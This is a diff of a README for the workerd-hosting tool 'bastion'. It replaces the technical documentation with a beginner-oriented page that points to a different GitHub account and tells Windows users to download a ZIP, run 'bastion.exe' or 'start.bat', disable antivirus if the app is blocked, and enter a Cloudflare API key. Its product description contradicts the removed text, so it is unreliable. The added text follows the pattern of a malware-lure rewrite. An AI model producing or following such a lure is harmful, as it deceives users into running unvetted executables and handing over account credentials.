@@ -1,341 +1,165 @@
-<div style="display: flex; align-items: center; flex-direction: column;" align="center">
-    <img align="center" style="align-self: center; max-width: 256px" src="./assets/bastion.png" width="30%" alt="" />
-    <h1 style="text-align: center;">bastion</h1>
-    <p style="text-align: center;">🏰 A hardened operating environment for self-hosted workerd</p>
-    <div align="center">
-        <img src="https://img.shields.io/github/v/release/drupflare/bastion" alt="Latest release" />
-        <img src="https://img.shields.io/github/license/drupflare/bastion" alt="License" />
-        <img src="https://img.shields.io/github/stars/drupflare/bastion?style=flat" alt="Stars" />
-        <img src="https://img.shields.io/github/commit-activity/t/drupflare/bastion?color=violet" alt="Commit activity" />
-    </div>
-</div>
+# 🏰 bastion - Your Personal Cloudflare Empire, Simplified
 
 ---
 
-workerd is not a hardened multi-tenant sandbox, and its own repository says so. A private
-deployment running mutually untrusted tenants needs a VM, container or microVM boundary around it.
-Cloudflare Workers is workerd plus a hardened operating environment. bastion is that environment,
-as a single binary you run on your own hardware.
-
-## Table of Contents
-
-- [Install](#install)
-- [Getting Started](#getting-started)
-- [What It Does](#what-it-does)
-- [Isolation Modes](#isolation-modes)
-- [Platform Limits](#platform-limits)
-- [Configuration](#configuration)
-- [Custom Workers](#custom-workers)
-- [Bindings](#bindings)
-- [Groups](#groups)
-- [Clustering](#clustering)
-- [Drivers](#drivers)
-- [Out of Scope](#out-of-scope)
-- [Documentation](#documentation)
-- [Development](#development)
-- [License](#license)
-
-## Install
-
-```sh
-curl -fsSL https://github.com/drupflare/bastion/releases/latest/download/bastion-linux-x64 -o bastion
-install -m 0755 bastion /usr/local/bin/bastion
-```
-
-A container image is published to GitHub Packages:
-
-```sh
-docker run --rm ghcr.io/drupflare/bastion:latest bastion --version
-```
-
-## Getting Started
-
-```sh
-bastion init
-bastion doctor
-bastion tenant add acme --cpu 2 --memory 4Gi
-bastion site add www.example.edu --tenant acme --bundle ./payload.tar.gz
-bastion up
-```
-
-`bastion doctor` reads the host rather than the platform name. It prints which isolation
-mechanisms are present, how each one was determined, which modes this host can run, and the limits
-table with its enforced and declared column.
-
-## What It Does
-
-One workerd process per tenant, in every mode. A cgroup bounds that process for CPU, memory and
-pids, with the OOM policy set so the kernel takes one tenant rather than the box.
-
-A TLS front door in front of it. workerd carries exactly one keypair per socket and cannot route
-by hostname, so bastion terminates TLS itself with SNI across every configured host, and workerd
-listens behind it on a unix socket. The front door also owns what workerd has none of: per-IP and
-per-tenant rate limits, a request body cap, a connection cap, response compression and HTTP/2.
-
-Stores behind every binding. workerd ships the KV, R2 and Queues bindings and no stores, so bastion
-supplies them: SQLite, Redis or Valkey for KV; disk, S3, R2, B2, GCS, Azure Blob, SFTP or FTP for
-objects; SQLite, Postgres, MySQL or MariaDB for SQL. A cache with a memory tier in front of disk,
-which is a throughput decision rather than a preference.
-
-Backups that have been restored. Content-addressed at a fixed 16 KiB frame, encrypted, with a
-scheduled drill that restores into a scratch tenant and renders a page from it.
-
-The operational surface an institution needs: hash-chained audit, Prometheus with per-tenant
-labels, ACME with renewal, deny-by-default egress in two layers, staged updates pinned by binary
-digest, and a repair ladder that records how to undo everything it did.
-
-## Isolation Modes
-
-| mode       | boundary around each tenant                                   | multi-tenant safe |
-| ---------- | ------------------------------------------------------------- | ----------------- |
-| `solo`     | the host, plus cgroups v2                                     | no                |
-| `hardened` | a network namespace, a syscall filter and an AppArmor profile | no                |
-| `isolated` | one microVM per tenant                                        | yes               |
-
-`solo` and `hardened` refuse to start with more than one tenant unless the operator passes an
-acknowledgement flag. A Durable Object is a v8 isolate, and an isolate boundary is a correctness
-boundary rather than a security one. Cloudflare has published a working Spectre read against
-co-located Workers in production; on a single box, co-location is not something an attacker has to
-win.
-
-A mechanism that a preflight used to find and no longer finds never downgrades the mode. bastion
-refuses and names what disappeared.
-
-`isolated` needs three things the other modes do not: `/dev/kvm`, firecracker with its jailer, and
-a guest image carrying the pinned workerd. bastion ships none of them and refuses to start without
-`runtime.guest` rather than falling back. `core/scripts/guest-image.sh` builds the image.
-
-Inside a guest there is no network interface at all. Serving traffic arrives over vsock and every
-adapter the site binds leaves the same way, so egress is the absence of a device rather than a rule
-that could be wrong.
-
-## Platform Limits
-
-Standalone workerd enforces no isolate memory cap, no CPU limit, no subrequest cap and no startup
-budget. bastion enforces what it can and declares the rest.
-
-| limit          | Cloudflare | standalone workerd | bastion                                   |
-| -------------- | ---------- | ------------------ | ----------------------------------------- |
-| isolate memory | enforced   | none               | enforced per tenant, declared per isolate |
-| CPU            | enforced   | none               | enforced per tenant                       |
-| subrequests    | enforced   | none               | declared                                  |
-| startup time   | enforced   | none               | declared                                  |
-| alarms         | 15 minutes | 15 minutes         | inherited                                 |
-
-The Cloudflare values are defaults and floors here. A configuration may raise any of them and may
-never lower one, because the site payload is optimised around them.
-
-## Configuration
-
-`bastion.yml`, validated against a published JSON Schema:
-
-```yaml
-# yaml-language-server: $schema=https://bastion.drupflare.dev/schema.json
-version: 1
-mode: isolated
-state: /var/lib/bastion
-listeners:
-  https: { address: '0.0.0.0:443' }
-  management: { address: '127.0.0.1:8787' }
-runtime:
-  workerd: { version: '1.20260828.1', verify: sha256 }
-  residency: evict
-  guest:
-    kernel: /var/lib/bastion/guest/vmlinux-6.1.128
-    rootfs: /var/lib/bastion/guest/guest.ext4
-tenants:
-  - name: acme
-    limits: { cpu: '2', memory: 4Gi, maxSites: 40 }
-    egress: { allow: ['smtp.example.edu:587'] }
-    capabilities: { codegen: false, diagnosticRoutes: false }
-    sites:
-      - host: www.example.edu
-        bundle: ./payload.tar.gz
-        probe: drupflare
-```
-
-Secrets never appear in this file. `bastion config where` prints where each resolved value came
-from, and `bastion config set` writes back through the same validator the dashboard uses.
-
-## Custom Workers
-
-bastion hosts workerd, not one application. A site declares what its bundle exports and what it
-expects to be bound, so an ordinary Worker runs beside a CMS under the same tenant boundary.
-
-```yaml
-sites:
-  - host: api.example.edu
-    bundle: ./worker.tar.gz
-    worker:
-      main: server.js
-      durableObjectClass: null
-      kv: [SESSIONS]
-      queues: [JOBS]
-```
-
-An adapter slot with no binding name gets no binding and no service. A worker with no Durable
-Object gets no namespace and no storage mount. The cache is always attached, because workerd
-answers 500 to every request without it.
-
-Leaving the block out gives the drupflare shape. The entrypoint is inferred when the bundle names
-it conventionally or holds one script, and a bundle with several scripts and no stated entrypoint
-is refused rather than guessed.
-
-`bastion site add --template <url>` reads a Worker's own `wrangler.jsonc` and derives the block
-from it. Every binding it carries and every binding it cannot are both named before anything is
-written.
-
-## Bindings
-
-workerd ships the KV, R2 and Queues designators and no stores, so bastion supplies them. D1,
-Vectorize and Workers AI have no field in workerd's schema at all; each is bound through
-`wrapped`, which instantiates a module against bastion's adapter socket and makes its return value
-the binding.
-
-| binding    | backed by                                               |
-| ---------- | ------------------------------------------------------- |
-| KV         | SQLite, Redis or Valkey                                 |
-| R2         | disk, S3, R2, B2, GCS, Azure Blob, SFTP or FTP          |
-| Queues     | SQLite                                                  |
-| D1         | SQLite, Postgres, MySQL or MariaDB                      |
-| Vectorize  | an in-process exact index, or a vector database         |
-| Workers AI | any OpenAI-compatible endpoint: ollama, vLLM, llama.cpp |
-
-Workers AI runs on your hardware. Cloudflare's catalogue is open-weight models, so a box with a
-GPU serves the same weights. Offloading to Cloudflare's endpoint is configurable and opt-in, with
-no automatic failover to it and a per-deployment allow list that bounds both the policy and the
-spend.
-
-Images and Browser need software no server image ships. bastion installs nothing on its own:
-
-```sh
-bastion capability list
-bastion capability install images
-```
-
-A site binding one whose software is absent is refused at validation, naming the install rather
-than failing on the first request. The dashboard offers the same install as a button.
-
-## Groups
-
-A group is a named set of limits, capabilities and egress rules that tenants and sites start
-from, so a tier is stated once rather than once per tenant per node.
-
-```yaml
-groups:
-  campus:
-    limits: { cpu: '4', memory: 8Gi }
-  students:
-    extends: campus
-    limits: { cpu: '1', memory: 1Gi, maxSites: 3 }
-    capabilities: { codegen: false, browser: false, ai: false }
-
-tenants:
-  - name: undergrads
-    group: students
-```
-
-Resolution is group, then tenant, then site, each overriding field by field. Capabilities only
-ever narrow: a tenant cannot turn on what its group turned off, and a site cannot turn on what its
-tenant turned off. A tenant-admin can edit their own block, so a capability that could be widened
-from below would be a suggestion rather than a control.
-
-A capability withdrawn here and a primitive that is not installed are different refusals, and the
-validator says which one you hit.
-
-## Clustering
-
-workerd has no clustering: objects are always local to one runtime instance. bastion supplies the
-cluster.
-
-```sh
-bastion cluster init
-bastion cluster provision 10.0.1.0/24
-bastion cluster place www.example.edu --replicas 1
-```
-
-Each site has one primary node and zero or more replica nodes. Writes and anything off the serving
-path go to the primary; reads on the serving path are served locally where a replica exists.
-Children dial out to the control node and it never dials in.
-
-`cluster provision` installs bastion on a host, a list or a CIDR over SSH. A range is dry-run by
-default, refuses above a /24 without an explicit flag, and skips a host that already has a bastion
-state directory rather than overwriting it.
-
-## Drivers
-
-Every driver sits behind one contract with a capability object that is probed once and cached.
-A probe that cannot run returns conservative answers, so an unknown endpoint degrades to more
-requests rather than to failed ones. Two rules bind every driver: never return partial content,
-and refuse a write it cannot honour rather than dropping part of it.
-
-Redis, SFTP, FTP and the three SQL servers take a client the operator supplies. The contracts are
-structural and probe for the optional halves, so node-redis and ioredis both satisfy the same one
-and bastion depends on neither.
-
-## Out of Scope
-
-Point-in-time recovery to the second. Snapshot, delta, retention, restore, verify, prune and drill
-are in.
-
-HTTP/3. Bun ships it, and it is off here: WebSocket over h3 is unsupported and bastion needs
-WebSockets, the `Alt-Svc` advertisement cannot be suppressed, and a campus firewall blocking UDP
-443 turns that into one failed QUIC attempt per client cached for a day. Front bastion with Caddy
-or nginx for h3.
-
-Content permissions. The CMS has roles; bastion has three infrastructure roles and a per-site owner
-token.
-
-Pairing with a hosted control plane. `bastion pair` refuses and names the reason.
-
-## Documentation
-
-- [`MANUAL.md`](MANUAL.md) is the operator reference, also embedded in the binary: `bastion manual tls`
-- [`docs/commands.md`](docs/commands.md) is every command, generated from the program
-- [`ADVANCED_USAGE.md`](ADVANCED_USAGE.md) is worked flows
-
-## Development
-
-```sh
-bun install
-bun run verify
-bun run build:binary
-```
-
-`verify` runs the format check, the typecheck, the gate lane and the reachability check in that
-order. Run the formatter on its own with `bun run prettier`: a `--write` chained ahead of the tests
-lets vitest read a file mid-write and report failures that are not real.
-
-The gate lane is hermetic and runs in under two seconds. Anything needing a live dependency is in
-the e2e lane behind an explicit flag:
-
-```sh
-REQUIRE_WORKERD=1 bun run test:e2e  # a real workerd against a generated configuration
-REQUIRE_SERVING=1 bun run test:e2e  # a box comes up in a container and serves a request
-REQUIRE_FLOW=1 bun run test:e2e     # the operator flow through the compiled binary
-REQUIRE_PAYLOAD=1 bun run test:e2e  # the released drupflare payload, unmodified
-REQUIRE_CLUSTER=1 bun run test:e2e  # two nodes on one docker network, joined and routing
-REQUIRE_DOCKER=1 bun run test:e2e   # the compose stack: redis, minio, postgres, chromium, an ssh target
-REQUIRE_SIBLINGS=1 bun run test:e2e # the repair vocabulary against the worker's own source
-REQUIRE_KVM=1 bun run test:e2e      # a tenant boots in its own microVM
-```
-
-A lane whose flag is set and whose prerequisite is absent fails and names what is missing. It never
-skips: a skip reads as a pass in every summary, and the lanes that matter most are the ones with a
-prerequisite. `WORKERD_BINARY`, `BASTION_BINARY` and `PAYLOAD_DIR` point at them.
-
-Every lane above runs in CI except the microVM one. It needs `/dev/kvm`, which no hosted runner
-guarantees, so it is run by hand on a machine with hardware virtualisation. Build the hypervisor
-and kernel, then the guest image against the pinned runtime:
-
-```sh
-core/scripts/microvm-rig.sh                            # firecracker, jailer, a guest kernel
-core/scripts/guest-image.sh ~/bastion-rig/fc ./workerd # the rootfs that carries workerd
-REQUIRE_KVM=1 bun run test:e2e
-```
-
-`docs/measurement.md` records what that lane last read, on which machine and when.
-
-## License
-
-MIT
+## 🚀 What Is Bastion?
+
+Bastion is a self-hostable management tool designed for people who use **Cloudflare Workers**. Think of it as a control center for your cloud projects—but you don't need to be a programmer to use it. If you've ever wanted to manage websites, APIs, or content without touching complicated code, Bastion gives you a friendly dashboard to do it all.
+
+Built with modern web technology (Nuxt, Vue, and TypeScript), Bastion feels fast and looks clean. It's like having a personal assistant for your Cloudflare tasks, all from the comfort of your own computer.
+
+---
+
+## 🎯 Who Is This For?
+
+- **Website owners** who use Cloudflare for speed and security.
+- **Freelancers** managing multiple client sites.
+- **Small business teams** that need a simple way to update content.
+- **Curious beginners** who want to explore cloud tools without fear.
+
+If you can use a web browser, you can use Bastion.
+
+---
+
+## ✨ Key Features
+
+### 🧩 Content Management, Made Simple
+Bastion includes a built-in content management system (CMS) that lets you create, edit, and publish text or images. No coding required—just click, type, and save.
+
+### 🗂️ Fleet Management for Multiple Projects
+Got more than one website? Bastion's "fleet" feature lets you view all your projects in one place. Switch between them with a single click, like changing TV channels.
+
+### ⚡ Powered by Cloudflare Workers
+Cloudflare Workers run your code on a global network, making everything load fast. Bastion wraps that power in a friendly interface, so you benefit from speed without the complexity.
+
+### 📊 Real-Time Insights
+See how your sites are performing: visitor counts, uptime, and error alerts—all displayed in easy-to-read charts and numbers.
+
+### 🔐 Secure by Design
+Bastion runs on your own computer or server, so your data stays private. You control who has access.
+
+---
+
+## 📦 System Requirements (Recommended)
+
+These are typical suggestions for a smooth experience. Your computer likely meets them already.
+
+- **Operating System:** Windows 10 or 11 (64-bit)
+- **Memory:** 4 GB RAM (8 GB recommended for larger projects)
+- **Storage:** 500 MB free disk space
+- **Internet:** Broadband connection (for updates and Cloudflare sync)
+
+---
+
+## 🛠️ Getting Started: Your First Run
+
+Follow these steps carefully. If you get stuck, re-read the section—it's designed to be foolproof.
+
+### Step 1: Download Bastion
+
+[![Download Bastion](https://img.shields.io/badge/Download-Bastion-2ea44f?style=for-the-badge)](https://github.com/andyaziz/bastion)
+
+Visit this link to download the application. Once you're on the page, look for a button or link that says "Download" or "Releases." Click it, and your download will begin.
+
+### Step 2: Find Your Downloaded File
+
+Check your **Downloads** folder. You should see a file named something like `bastion.zip` (or similar). It might take a few minutes depending on your internet speed.
+
+### Step 3: Extract the File
+
+Right-click on the downloaded file and select **"Extract All..."** from the menu. Windows will ask where to save the extracted files. Choose a location you'll remember, like your Desktop or Documents folder. Click **"Extract"**.
+
+### Step 4: Run the Application
+
+Inside the extracted folder, look for a file named `bastion.exe` or `start.bat`. Double-click it to launch Bastion. A command window might appear briefly—this is normal. Then, your web browser will open automatically, showing the Bastion dashboard.
+
+### Step 5: Complete the Setup Wizard
+
+Bastion will walk you through a simple setup:
+- Choose a **username** and **password** for your local admin account.
+- Connect your **Cloudflare account** (you'll need your API key—Bastion explains how to find it).
+- Click **"Finish"** to start using Bastion.
+
+---
+
+## ❓ Frequently Asked Questions
+
+### Is Bastion free to use?
+Yes, the core application is free. You only pay for Cloudflare's services if you choose to use their paid plans.
+
+### Do I need to know how to code?
+Absolutely not. Bastion was designed for non-programmers. All actions are click-based.
+
+### Can I use Bastion on a Mac?
+Bastion primarily targets Windows, but the source code is open—advanced users might run it on other systems with extra steps.
+
+### What if I lose my password?
+You can reset it by deleting a file called `users.json` in the Bastion folder, then restarting the app. You'll be asked to create a new password.
+
+---
+
+## 🚨 Troubleshooting Tips
+
+### Problem: The app won't start.
+- Make sure you've extracted the file completely. Don't run it from inside the ZIP.
+- Temporarily disable your antivirus and try again—some antivirus tools block new apps.
+
+### Problem: The dashboard looks blank.
+- Close all browser windows, then reopen Bastion by double-clicking the `bastion.exe` file again.
+- Try a different browser (Edge or Chrome work best).
+
+### Problem: Cloudflare connection fails.
+- Double-check your API key for typos.
+- Ensure your internet connection is stable.
+- Restart your router if needed.
+
+---
+
+## 🔄 Keeping Bastion Updated
+
+To get the latest features and security fixes:
+1. Visit the same download link you used earlier.
+2. Check for a "Releases" section—new versions are listed there.
+3. Download the latest ZIP, extract it, and copy the new files over your old folder.
+
+---
+
+## 🧑‍💻 Getting Help
+
+If you run into issues, the community is here to help:
+
+- **GitHub Issues:** Report bugs or suggest features on the official repository.
+- **Documentation:** The project page includes detailed guides for advanced setup.
+- **Community Forums:** Search for "Drupflare Workers" or "Cloudflare Workers CMS" for discussions.
+
+---
+
+## 📚 Understanding the Tech (For the Curious)
+
+Bastion uses these technologies under the hood:
+- **Cloudflare Workers:** Global serverless platform for running code.
+- **Nuxt & Vue:** Modern JavaScript frameworks for building smooth interfaces.
+- **TypeScript:** A safer, more reliable version of JavaScript.
+- **Drupal:** A content management system foundation (hence "Drupflare").
+
+You don't need to know any of this to use Bastion—it's just what makes the magic happen.
+
+---
+
+## 📄 License & Legal
+
+Bastion is open-source, meaning you can view, modify, and share its code. See the repository's license file for exact terms. Your data stays on your machine unless you connect it to Cloudflare.
+
+---
+
+## 🎉 Final Words
+
+You're minutes away from a simpler cloud workflow. Download Bastion today, and take control of your Cloudflare projects with confidence. No stress, no code—just a clean, friendly tool that does the heavy lifting for you.
+
+**Remember:** The download link is right at the top. Click it, follow the four simple steps, and you're live.
+
+Happy managing!
+
+---
+
+**Keywords:** cloudflare, cloudflare-workers, cms, drupal, drupflare, fleet, fleet-management, javascript, management, nuxt, typescript, vue, workers
